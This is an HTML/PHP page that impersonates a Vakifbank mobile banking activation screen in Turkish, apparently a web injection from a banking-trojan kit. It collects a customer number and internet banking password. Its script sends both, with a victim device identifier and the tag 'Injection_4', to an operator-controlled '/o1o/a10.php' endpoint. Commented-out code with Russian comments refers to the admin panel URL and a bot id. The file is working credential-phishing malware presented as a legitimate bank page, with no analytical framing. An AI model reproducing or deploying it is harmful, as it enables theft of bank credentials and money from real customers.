<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vakifbank</title>

    <style>
        html, body {
            text-align: center;
            position: relative;
            padding: 0;
            margin: 0;
            width: 100%;
            height: 98%;
            color: #555;
            font-family: serif, Arial;

            background: #cccccc;
        }

        label {
            font: 14px Tahoma;
            color: #000;
            width: 100px;
            position: relative;
            text-align: left;
            margin-top: 10px;
            font-weight: bold;
            margin-bottom: 10px;
            float: left;
            margin-left: 10%;
        }

        h4 {
            color: #eb0779;
            text-align: left;
            font: 14px "PT Sans";
            margin-left: 3%;
        }

        input[type="text"]::-webkit-input-placeholder {
            color: #e28990;
        }

        input[type="text"]:focus {
            outline: none;
        }

        input[type="password"]:focus {
            outline: none;
        }

        input[type="number"]:focus {
            outline: none;
        }

        input[type=number]::-webkit-inner-spin-button,
        input[type=number]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .input-field {
            border: 1px solid #b1b1b1;
            background: #fff;
            height: 32px;
            width: 80%;
            margin-bottom: 15px;
            font-family: "Consolas", serif;
            font-size: 16px;
            color: black;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            padding-left: 10px;
            padding-right: 10px;
        }

        .header {
            font: 16px Tahoma;
            color: #000;
            font-weight: bold;
            margin: 10px 20px 20px;
            text-align: left;
        }

        .submit-button {
            border: none;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            padding: 10px;
            text-decoration: none;
            color: #000;
            font: 14px Tahoma;
            width: 90%;
            background: #fff;
            font-weight: bold;
        }

        .input-field-block {
            background: #fff;
            width: 90%;
            position: relative;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            margin: 0 auto 20px;
        }

        .red {
            width: 90%;
            font: 12px Tahoma;
            font-weight: bold;
            color: red;
            margin: 10px auto 0;
            text-align: left;
        }

        .clear {
            clear: both;
        }

        .fielderror {
            border: 1px solid #f00;
            background: #fff;
            height: 32px;
            width: 80%;
            margin-bottom: 15px;
            font-family: "Consolas", serif;
            font-size: 16px;
            color: black;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            padding-left: 10px;
            padding-right: 10px;
        }

    </style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div id="content_div">
        <div class="header">Mobil Bankac&#617;l&#617;k Aktivasyon</div>

        <form action="null" method="post" id="_mainForm" target="flow_handler">
            <input type="hidden" name="name" value="Vakifbank">
            <div class="input-field-block">
                <label>M&#252;&#351;teri&nbsp;Numaras&#617;&nbsp;(Bireysel)</label>
                <div class="clear"></div>
                <input type="number" name ="M&#252;&#351;teri&nbsp;Numaras&#617;&nbsp;(Bireysel)" id="id" class="input-field" maxlength="12" onKeyUp="if(this.value>99999999999999999999999999){this.value=this.value.substr(0,15);}" autofocus="autofocus" />
                <div class="clear"></div>
            </div>

            <div class="input-field-block">
                <label>&#304;nternet&nbsp;Bankac&#617;l&#617;&#287;&#617;&nbsp;&#350;ifresi</label>
                <div class="clear"></div>
                <input name="&#304;nternet&nbsp;Bankac&#617;l&#617;&#287;&#617;&nbsp;&#350;ifresi" id="password" type="password" class="input-field"  maxlength="12" />
                <div class="clear"></div>
            </div>

            <button id="submitBtn1" type="submit" class="submit-button">Giri&#351;</button>
        </form>

        <div class="red">
            Aktivasyon i&#351;leminiz tamamland&#617;&#287;&#617;nda tek kullan&#617;ml&#617;k &#351;ifre tercihiniz de&#287;i&#351;ecek, &#304;nternet&nbsp;Bankac&#617;l&#617;&#287;&#617; ve Mobil Bankac&#617;l&#617;k giri&#351;inde ve tek kullan&#617;ml&#617;k &#351;ifre gerektiren t&#252;m i&#351;lemlerde art&#617;k Cep &#304;mza kullan&#617;lacakt&#617;r.
            <br /><br />
            Mobil uygulama sadece bireysel m&#252;&#351;terilerimiz i&#231;indir.
        </div>

        <br />
        <br />
        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

    <script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота

*/
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};

                        if (oNumInp.value.length < 9) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "vakifbank'+
					'", "musteri_numarasi_bireysel_": "'+oNumInp.value+
					'", "internet_bankaciligi_sifresi": "'+oCodeInp.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/

						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						document.location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|vakifbank|"+oNumInp.value+"|"+oCodeInp.value+"|");

						return false;
                    };

                })();
            </script>
</body>
</html>
